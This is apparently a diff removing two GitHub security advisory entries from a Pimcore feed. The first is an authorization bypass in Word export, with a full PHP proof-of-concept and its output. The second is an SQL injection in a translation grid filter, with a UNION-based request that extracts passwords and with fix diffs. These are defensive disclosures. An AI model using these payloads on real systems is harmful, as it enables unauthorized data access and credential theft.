-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>WordExport</code> export flow only checks whether the current backend user has the feature permission <code>word_export</code>. It does not verify access rights on the target element itself.<br>As a result, a low-privileged backend user can export document content even when the user does not have <code>view</code> permission on that document.</p>
-<p>In the local Docker reproduction, a low-privileged user successfully exported sensitive content from a page the user was not allowed to view:</p>
-<ul>
-<li><code>POC-WORDEXPORT-TITLE</code></li>
-<li><code>POC-WORDEXPORT-DESC</code></li>
-</ul>
-<h3 id="root-cause">Root Cause</h3>
-<p>The controller only performs a feature-level permission check before starting the export flow:</p>
-<ul>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/%5BTranslationController.php%5D(https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L44)#L41"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L41">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/%5BTranslationController.php%5D(https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L56)#L44">TranslationController.php</a></li>
-</ul>
-<p>It then directly resolves the target element from attacker-controlled <code>type/id</code> input:</p>
-<ul>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L56"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L58">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/%5BTranslationController.php%5D(https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L113)#L58"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L72">TranslationController.php</a></li>
-</ul>
-<p>For document-like elements such as <code>Page</code> and <code>Snippet</code>, it renders content in an admin context:</p>
-<ul>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L72"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L114">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L113">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L114">TranslationController.php</a></li>
-</ul>
-<p>No object-level authorization check such as <code>isAllowed('view')</code> is enforced on the target element.</p>
-<h3 id="affected-scope">Affected Scope</h3>
-<p>Based on the source code, the following element types may be affected:</p>
-<ul>
-<li><code>page</code></li>
-<li><code>snippet</code></li>
-<li><code>email</code></li>
-<li><code>object</code></li>
-</ul>
-<p>For page-like documents, the <code>pimcore_admin = true</code> rendering context may expose additional backend-visible content.</p>
-<h3 id="preconditions">Preconditions</h3>
-<ul>
-<li>The attacker is an authenticated backend user</li>
-<li>The attacker has the <code>word_export</code> permission</li>
-<li>The attacker does not have <code>view</code> permission on the target document</li>
-</ul>
-<h3 id="reproduction-environment">Reproduction Environment</h3>
-<ul>
-<li>Reproduction root: <code>pimcore-12.3.3-repro</code></li>
-<li>Standalone PoC script: <a href="pimcore-12.3.3-repro/tools/poc_wordexport.php"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3-repro/tools/poc_wordexport.php">poc_wordexport.php</a></li>
-</ul>
-<pre><code class="language-php">&lt;?php
-declare(strict_types=1);
-
-use Pimcore\Bundle\WordExportBundle\Controller\TranslationController as WordExportController;
-use Pimcore\Controller\UserAwareController;
-use Pimcore\Model\Document\Page;
-use Pimcore\Model\User;
-use Pimcore\Security\User\TokenStorageUserResolver;
-use Pimcore\Security\User\User as SecurityUser;
-use Pimcore\Serializer\Serializer as PimcoreSerializer;
-use Pimcore\Tool\Authentication;
-use Symfony\Component\DependencyInjection\ContainerInterface;
-use Symfony\Component\Filesystem\Filesystem;
-use Symfony\Component\HttpFoundation\Request;
-use Symfony\Component\HttpFoundation\RequestStack;
-use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
-use Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorage;
-
-require dirname(__DIR__) . '/vendor/autoload.php';
-
-define('PIMCORE_PROJECT_ROOT', dirname(__DIR__));
-
-try {
-    \Pimcore\Bootstrap::bootstrap();
-
-    $kernel = new \App\Kernel('dev', true);
-    \Pimcore::setKernel($kernel);
-    $kernel-&gt;boot();
-
-    $container = $kernel-&gt;getContainer();
-
-    /** @var RequestStack $requestStack */
-    $requestStack = getService($container, [
-        RequestStack::class,
-        'request_stack',
-    ]);
-
-    $admin = User::getByName('admin');
-    if (!$admin instanceof User) {
-        fail('admin user is missing');
-    }
-
-    $auditor = User::getByName('auditor_wordexport');
-    if (!$auditor instanceof User) {
-        $auditor = new User();
-        $auditor-&gt;setParentId(0);
-        $auditor-&gt;setName('auditor_wordexport');
-    }
-
-    $auditor-&gt;setAdmin(false);
-    $auditor-&gt;setActive(true);
-    $auditor-&gt;setPassword(Authentication::getPasswordHash('auditor_wordexport', 'auditor-pass'));
-    $auditor-&gt;setPermissions(['word_export']);
-    $auditor-&gt;setRoles([]);
-    $auditor-&gt;setWorkspacesDocument([]);
-    $auditor-&gt;setWorkspacesAsset([]);
-    $auditor-&gt;setWorkspacesObject([]);
-    $auditor-&gt;save();
-
-    $page = Page::getByPath('/poc-wordexport-secret-page');
-    if (!$page instanceof Page) {
-        $page = new Page();
-        $page-&gt;setParentId(1);
-        $page-&gt;setKey('poc-wordexport-secret-page');
-    }
-
-    $page-&gt;setPublished(true);
-    $page-&gt;setController('App\\Controller\\DefaultController::defaultAction');
-    $page-&gt;setTemplate('default/default.html.twig');
-    $page-&gt;setTitle('POC-WORDEXPORT-TITLE');
-    $page-&gt;setDescription('POC-WORDEXPORT-DESC');
-    $page-&gt;setProperty('language', 'text', 'en', false, true);
-    $page-&gt;setUserOwner($admin-&gt;getId());
-    $page-&gt;setUserModification($admin-&gt;getId());
-    $page-&gt;save();
-
-    $canViewPage = $page-&gt;getDao()-&gt;isAllowed('view', $auditor);
-
-    $tokenResolver = buildTokenResolver($auditor);
-    $controller = wireController(new WordExportController(), $container, $tokenResolver);
-
-    $exportId = 'wordexportpoc1';
-    $exportRequest = new Request([], [
-        'id' =&gt; $exportId,
-        'data' =&gt; json_encode([
-            ['type' =&gt; 'document', 'id' =&gt; $page-&gt;getId()],
-        ], JSON_THROW_ON_ERROR),
-        'source' =&gt; 'en',
-    ]);
-
-    $requestStack-&gt;push($exportRequest);
-    $controller-&gt;wordExportAction($exportRequest, new Filesystem());
-    $requestStack-&gt;pop();
-
-    $downloadRequest = new Request(['id' =&gt; $exportId]);
-    $requestStack-&gt;push($downloadRequest);
-    $downloadResponse = $controller-&gt;wordExportDownloadAction($downloadRequest);
-    $requestStack-&gt;pop();
-
-    $wordContent = (string) $downloadResponse-&gt;getContent();
-
-    echo json_encode([
-        'vulnerability' =&gt; 'wordexport_authorization_bypass',
-        'user' =&gt; [
-            'id' =&gt; $auditor-&gt;getId(),
-            'name' =&gt; $auditor-&gt;getName(),
-            'permissions' =&gt; $auditor-&gt;getPermissions(),
-        ],
-        'target_page' =&gt; [
-            'id' =&gt; $page-&gt;getId(),
-            'path' =&gt; $page-&gt;getFullPath(),
-            'title' =&gt; $page-&gt;getTitle(),
-            'description' =&gt; $page-&gt;getDescription(),
-            'user_can_view_page' =&gt; $canViewPage,
-        ],
-        'result' =&gt; [
-            'download_contains_title' =&gt; str_contains($wordContent, 'POC-WORDEXPORT-TITLE'),
-            'download_contains_description' =&gt; str_contains($wordContent, 'POC-WORDEXPORT-DESC'),
-        ],
-    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), PHP_EOL;
-} catch (Throwable $e) {
-    fail(sprintf(
-        '%s: %s in %s:%d%s',
-        $e::class,
-        $e-&gt;getMessage(),
-        $e-&gt;getFile(),
-        $e-&gt;getLine(),
-        $e-&gt;getTraceAsString() ? PHP_EOL . $e-&gt;getTraceAsString() : ''
-    ));
-}
-
-function wireController(
-    UserAwareController $controller,
-    ContainerInterface $container,
-    TokenStorageUserResolver $tokenResolver
-): UserAwareController
-{
-    $controller-&gt;setContainer($container);
-    $controller-&gt;setTokenResolver($tokenResolver);
-
-    if (method_exists($controller, 'setPimcoreSerializer')) {
-        /** @var PimcoreSerializer $serializer */
-        $serializer = getService($container, [
-            PimcoreSerializer::class,
-            'Pimcore\\Serializer\\Serializer',
-        ]);
-        $controller-&gt;setPimcoreSerializer($serializer);
-    }
-
-    return $controller;
-}
-
-function buildTokenResolver(User $user): TokenStorageUserResolver
-{
-    $tokenStorage = new TokenStorage();
-    $proxyUser = new SecurityUser($user);
-    $token = new UsernamePasswordToken($proxyUser, 'pimcore_admin', $proxyUser-&gt;getRoles());
-    $tokenStorage-&gt;setToken($token);
-
-    return new TokenStorageUserResolver($tokenStorage);
-}
-
-function getService(ContainerInterface $container, array $ids): mixed
-{
-    foreach ($ids as $id) {
-        try {
-            if ($container-&gt;has($id)) {
-                return $container-&gt;get($id);
-            }
-        } catch (Throwable) {
-        }
-    }
-
-    fail('Unable to resolve service: ' . implode(', ', $ids));
-}
-
-function fail(string $message): never
-{
-    fwrite(STDERR, $message . PHP_EOL);
-    exit(1);
-}
-</code></pre>
-<h3 id="reproduction-steps">Reproduction Steps</h3>
-<ol>
-<li>Create a low-privileged user named <code>auditor_wordexport</code> with only the <code>word_export</code> permission and no document workspace permissions.</li>
-<li>Create a test page at <code>/poc-wordexport-secret-page</code> containing sensitive values:<ul>
-<li><code>title = POC-WORDEXPORT-TITLE</code></li>
-<li><code>description = POC-WORDEXPORT-DESC</code></li>
-</ul>
-</li>
-<li>Verify that the user does not have <code>view</code> permission on that page.</li>
-<li>Execute <code>wordExportAction()</code> and <code>wordExportDownloadAction()</code> as that user.</li>
-<li>Check whether the exported HTML contains the sensitive values.</li>
-</ol>
-<p>Reproduction command:</p>
-<pre><code class="language-bash">cd pimcore-12.3.3-repro
-docker compose exec -T php php tools/poc_wordexport.php
-</code></pre>
-<h3 id="reproduction-result">Reproduction Result</h3>
-<p>Relevant PoC output:</p>
-<pre><code class="language-json">{
-  "vulnerability": "wordexport_authorization_bypass",
-  "user": {
-    "name": "auditor_wordexport",
-    "permissions": [
-      "word_export"
-    ]
-  },
-  "target_page": {
-    "path": "/poc-wordexport-secret-page",
-    "title": "POC-WORDEXPORT-TITLE",
-    "description": "POC-WORDEXPORT-DESC",
-    "user_can_view_page": false
-  },
-  "result": {
-    "download_contains_title": true,
-    "download_contains_description": true
-  }
-}
-</code></pre>
-<p>This shows that:</p>
-<ul>
-<li>The user cannot view the target page</li>
-<li>The exported file still contains the page's sensitive content</li>
-</ul>
-<p>This confirms that the issue is practically exploitable.</p>
-<h3 id="security-impact">Security Impact</h3>
-<ul>
-<li>Unauthorized disclosure of structured page fields</li>
-<li>Unauthorized export of restricted backend content</li>
-<li>Potential exposure of unpublished or otherwise restricted content</li>
-<li>Lateral data access by low-privileged backend accounts</li>
-</ul>
-<h3 id="remediation">Remediation</h3>
-<ol>
-<li>Perform object-level authorization immediately after resolving the element from <code>type/id</code>.</li>
-<li>Require at least <code>view</code> permission on the target element.</li>
-<li>Apply consistent authorization checks across <code>page</code>, <code>snippet</code>, <code>email</code>, and <code>object</code>.</li>
-<li>Bind export creation and export download to the requesting user or an equivalent authorization context.</li>
-<li>Add regression tests to ensure that users with <code>word_export</code> but without element <code>view</code> permission cannot export content.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-332x-r494-54fq">https://github.com/pimcore/pimcore/security/advisories/GHSA-332x-r494-54fq</a></li>
-<li><a href="https://github.com/pimcore/pimcore/pull/19112">https://github.com/pimcore/pimcore/pull/19112</a></li>
-<li><a href="https://github.com/pimcore/pimcore/commit/0ce2232b6f92c79d0ac244e95e21f55c37456ef1">https://github.com/pimcore/pimcore/commit/0ce2232b6f92c79d0ac244e95e21f55c37456ef1</a></li>
-<li><a href="https://github.com/pimcore/pimcore/releases/tag/v12.3.7">https://github.com/pimcore/pimcore/releases/tag/v12.3.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-332x-r494-54fq">https://github.com/advisories/GHSA-332x-r494-54fq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-332x-r494-54fq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-27T22:27:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/admin-ui-classic-bundle] Pimcore Admin Classic Bundle Vulnerable to SQL Injection in Translation Grid Date Filter via Unsanitized Property Parameter]]></title>
-        <id>https://github.com/advisories/GHSA-h4ph-crvj-9h92</id>
-        <link href="https://github.com/advisories/GHSA-h4ph-crvj-9h92"/>
-        <updated>2026-07-10T19:07:23.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="github-security-advisory-draft--gm-369">GitHub Security Advisory Draft — GM-369</h1>
-<h2 id="summary">Summary</h2>
-<p>SQL injection in Pimcore's translation grid date filter — the user-supplied <code>property</code> field from the filter JSON is interpolated directly into a <code>UNIX_TIMESTAMP(DATE(FROM_UNIXTIME(...)))</code> SQL expression without parameterization or allowlist validation.</p>
-<h2 id="severity">Severity</h2>
-<p>CVSS 3.1: 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
-<h2 id="affected-component">Affected Component</h2>
-<ul>
-<li><strong>Package:</strong> <code>pimcore/admin-ui-classic-bundle</code></li>
-<li><strong>File:</strong> <code>src/Controller/Admin/TranslationController.php</code></li>
-<li><strong>Lines:</strong> 565 (input), 569 (inadequate sanitization), 593 (injection point)</li>
-<li><strong>Endpoint:</strong> <code>POST /admin/translation/translations</code></li>
-</ul>
-<h2 id="description">Description</h2>
-<p>The translation grid endpoint processes JSON filter parameters. When a filter has <code>type: "date"</code>, the <code>property</code> field is extracted and used to construct a SQL expression:</p>
-<pre><code class="language-php">$fieldname = $filter[$propertyField];              // Line 565 — user input
-$fieldname = str_replace('--', '', $fieldname);    // Line 569 — trivially bypassable
-$fieldname = $tableName . '.' . $fieldname;        // Line 577
-$fieldname = "UNIX_TIMESTAMP(DATE(FROM_UNIXTIME({$fieldname})))";  // Line 593 — injection
-</code></pre>
-<p>The <code>str_replace('--', '')</code> sanitization is trivially bypassable (use <code>/**/</code> comments or <code>----</code>). In non-language mode, <code>$fieldname</code> is concatenated directly into the SQL condition without quoting or parameterization.</p>
-<h2 id="impact">Impact</h2>
-<p>Authenticated user with translations view permission can extract arbitrary database data via UNION-based or error-based SQL injection. Combined with GM-249 (unsafe unserialize), this enables an SQLi → deserialization → RCE chain.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code>POST /admin/translation/translations
-filter=[{"property":"1))) UNION SELECT password FROM users WHERE ((1","type":"date","operator":"eq","value":"2026-01-01"}]
-</code></pre>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Validate <code>$fieldname</code> against an allowlist of valid column names before SQL interpolation:</p>
-<pre><code class="language-php">$allowedDateColumns = ['creationDate', 'modificationDate'];
-if (!in_array($fieldname, $allowedDateColumns, true)) {
-    continue;
-}
-</code></pre>
-<h2 id="references">References</h2>
-<ul>
-<li>CWE-89: SQL Injection</li>
-<li>Related: CVE-2026-27461 (RLIKE injection in Dependency/Dao.php — different code path)</li>
-</ul>
-<hr>
-<h2 id="suggested-fix-1">Suggested Fix</h2>
-<p>In <code>TranslationController.php</code>: (1) Add allowlist check for non-language fieldnames before processing. (2) Replace raw string interpolation <code>UNIX_TIMESTAMP(DATE(FROM_UNIXTIME({$fieldname})))</code> with <code>$db-&gt;quoteIdentifier($fieldname)</code> to prevent SQL injection in date filter expressions.</p>
-<pre><code class="language-diff">--- a/src/Controller/Admin/TranslationController.php
-+++ b/src/Controller/Admin/TranslationController.php
-@@ -569,7 +569,15 @@ class TranslationController extends AdminAbstractController
-                 $fieldname = str_replace('--', '', $fieldname);
- 
-                 if (!$languageMode &amp;&amp; in_array($fieldname, $validLanguages)
-                     || $languageMode &amp;&amp; !in_array($fieldname, $validLanguages)) {
-                     continue;
-                 }
- 
-+                // Allowlist non-language fieldnames to prevent SQL injection
-+                $allowedNonLanguageFields = ['key', 'type', 'creationDate', 'modificationDate'];
-+                if (!$languageMode &amp;&amp; !in_array($fieldname, $allowedNonLanguageFields) &amp;&amp; !in_array($fieldname, $validLanguages)) {
-+                    continue;
-+                }
-+
-                 if (!$languageMode) {
-                     $fieldname = $tableName . '.' . $fieldname;
-                 }
-@@ -582,7 +590,7 @@ class TranslationController extends AdminAbstractController
-                         } elseif ($filter[$operatorField] == 'eq') {
-                             $operator = '=';
--                            $fieldname = "UNIX_TIMESTAMP(DATE(FROM_UNIXTIME({$fieldname})))";
-+                            // Use validated fieldname only — never interpolate raw user input into SQL functions
-+                            $fieldname = sprintf('UNIX_TIMESTAMP(DATE(FROM_UNIXTIME(%s)))', $db-&gt;quoteIdentifier($fieldname));
-                         }
-</code></pre>
-<hr>
-<h2 id="proposed-fix">Proposed Fix</h2>
-<pre><code class="language-diff">--- a/src/Controller/Admin/TranslationController.php
-+++ b/src/Controller/Admin/TranslationController.php
-@@ -569,7 +569,15 @@ class TranslationController extends AdminAbstractController
-                 $fieldname = str_replace('--', '', $fieldname);
- 
-                 if (!$languageMode &amp;&amp; in_array($fieldname, $validLanguages)
-                     || $languageMode &amp;&amp; !in_array($fieldname, $validLanguages)) {
-                     continue;
-                 }
- 
-+                // Allowlist non-language fieldnames to prevent SQL injection
-+                $allowedNonLanguageFields = ['key', 'type', 'creationDate', 'modificationDate'];
-+                if (!$languageMode &amp;&amp; !in_array($fieldname, $allowedNonLanguageFields) &amp;&amp; !in_array($fieldname, $validLanguages)) {
-+                    continue;
-+                }
-+
-                 if (!$languageMode) {
-                     $fieldname = $tableName . '.' . $fieldname;
-                 }
-@@ -582,7 +590,7 @@ class TranslationController extends AdminAbstractController
-                         } elseif ($filter[$operatorField] == 'eq') {
-                             $operator = '=';
--                            $fieldname = "UNIX_TIMESTAMP(DATE(FROM_UNIXTIME({$fieldname})))";
-+                            // Use validated fieldname only — never interpolate raw user input into SQL functions
-+                            $fieldname = sprintf('UNIX_TIMESTAMP(DATE(FROM_UNIXTIME(%s)))', $db-&gt;quoteIdentifier($fieldname));
-                         }
-</code></pre>
-<p>Happy to submit this as a PR against a private fork if that is the preferred workflow.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-h4ph-crvj-9h92">https://github.com/pimcore/pimcore/security/advisories/GHSA-h4ph-crvj-9h92</a></li>
-<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/pull/1111">https://github.com/pimcore/admin-ui-classic-bundle/pull/1111</a></li>
-<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/commit/80e57a23d9e19574eddfe9b08e8f26785b2b0d90">https://github.com/pimcore/admin-ui-classic-bundle/commit/80e57a23d9e19574eddfe9b08e8f26785b2b0d90</a></li>
-<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v2.3.6">https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v2.3.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-h4ph-crvj-9h92">https://github.com/advisories/GHSA-h4ph-crvj-9h92</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h4ph-crvj-9h92</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-27T00:35:56.000Z</published>
     </entry>
 </feed>
